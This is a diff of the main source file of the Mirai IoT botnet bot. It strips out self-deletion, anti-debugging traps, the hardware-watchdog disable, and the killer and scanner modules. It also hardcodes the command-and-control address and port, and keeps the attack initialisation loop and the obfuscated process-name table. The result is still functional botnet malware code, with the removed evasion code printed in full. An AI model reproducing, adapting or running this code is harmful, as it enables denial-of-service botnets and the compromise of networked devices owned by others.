@@ -19,10 +19,8 @@
 #include "table.h"
 #include "rand.h"
 #include "attack.h"
-//#include "killer.h"
-//#include "scanner.h"
 #include "util.h"
-//#include "resolv.h"
+
 
 static void anti_gdb_entry(int);
 static void resolve_cnc_addr(void);
@@ -53,33 +51,6 @@ int main(int argc, char **args)
     int tbl_exec_succ_len;
     int pgid, pings = 0;
 
-#ifndef DEBUG
-    sigset_t sigs;
-    #int wfd;
-
-    // Delete self
-    unlink(args[0]);
-
-    // Signal based control flow
-    sigemptyset(&sigs);
-    sigaddset(&sigs, SIGINT);
-    sigprocmask(SIG_BLOCK, &sigs, NULL);
-    signal(SIGCHLD, SIG_IGN);
-    signal(SIGTRAP, &anti_gdb_entry);
-
-    // Prevent watchdog from rebooting device
-    if ((wfd = open("/dev/watchdog", 2)) != -1 ||
-        (wfd = open("/dev/misc/watchdog", 2)) != -1)
-    {
-        int one = 1;
-
-        ioctl(wfd, 0x80045704, &one);
-        close(wfd);
-        wfd = 0;
-    }
-    chdir("/");
-#endif
-
 #ifdef DEBUG
     printf("DEBUG MODE YO\n");
 
@@ -109,9 +80,6 @@ int main(int argc, char **args)
 #ifdef DEBUG
     unlock_tbl_if_nodebug(args[0]);
     anti_gdb_entry(0);
-#else
-    if (unlock_tbl_if_nodebug(args[0]))
-        raise(SIGTRAP);
 #endif
 
     ensure_single_instance();
@@ -153,12 +121,7 @@ int main(int argc, char **args)
     close(STDERR);
 #endif
     attack_init();
-    //killer_init();
-#ifndef DEBUG
-#ifdef MIRAI_TELNET
-    scanner_init();
-#endif
-#endif
+
     while (TRUE)
     {
         fd_set fdsetrd, fdsetwr, fdsetex;
@@ -355,24 +318,9 @@ static void anti_gdb_entry(int sig)
 
 static void resolve_cnc_addr(void)
 {
-    //struct resolv_entries *entries;
 
-    //table_unlock_val(TABLE_CNC_DOMAIN);
-    //entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
-    //table_lock_val(TABLE_CNC_DOMAIN);
-    /*if (entries == NULL)
-    {
-#ifdef DEBUG
-        printf("[main] Failed to resolve CNC address\n");
-#endif
-        return;
-    }
-*/    srv_addr.sin_addr.s_addr = CNC_ADDRS;//entries->addrs[rand_next() % entries->addrs_len];
-    //resolv_entries_free(entries);
-
-    //table_unlock_val(TABLE_CNC_PORT);
-    srv_addr.sin_port = CNC_PORT;//*((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
-    //table_lock_val(TABLE_CNC_PORT);
+    srv_addr.sin_addr.s_addr = CNC_ADDRS;
+    srv_addr.sin_port = CNC_PORT;
 
 #ifdef DEBUG
     printf("[main] Resolved domain\n");
@@ -454,7 +402,6 @@ static void ensure_single_instance(void)
         
         sleep(5);
         close(fd_ctrl);
-        //killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
         ensure_single_instance(); // Call again, so that we are now the control
     }
     else
@@ -465,7 +412,6 @@ static void ensure_single_instance(void)
             printf("[main] Failed to call listen() on fd_ctrl\n");
             close(fd_ctrl);
             sleep(5);
-            //killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
             ensure_single_instance();
 #endif
         }
@@ -477,7 +423,6 @@ static void ensure_single_instance(void)
 
 static BOOL unlock_tbl_if_nodebug(char *argv0)
 {
-    // ./dvrHelper = 0x2e 0x2f 0x64 0x76 0x72 0x48 0x65 0x6c 0x70 0x65 0x72
     char buf_src[18] = {0x2f, 0x2e, 0x00, 0x76, 0x64, 0x00, 0x48, 0x72, 0x00, 0x6c, 0x65, 0x00, 0x65, 0x70, 0x00, 0x00, 0x72, 0x00}, buf_dst[12];
     int i, ii = 0, c = 0;
     uint8_t fold = 0xAF;
@@ -489,7 +434,6 @@ static BOOL unlock_tbl_if_nodebug(char *argv0)
         (void (*) (void))table_lock_val,
         (void (*) (void))util_memcpy,
         (void (*) (void))util_strcmp,
-        //(void (*) (void))killer_init,
         (void (*) (void))anti_gdb_entry
     };
     BOOL matches;
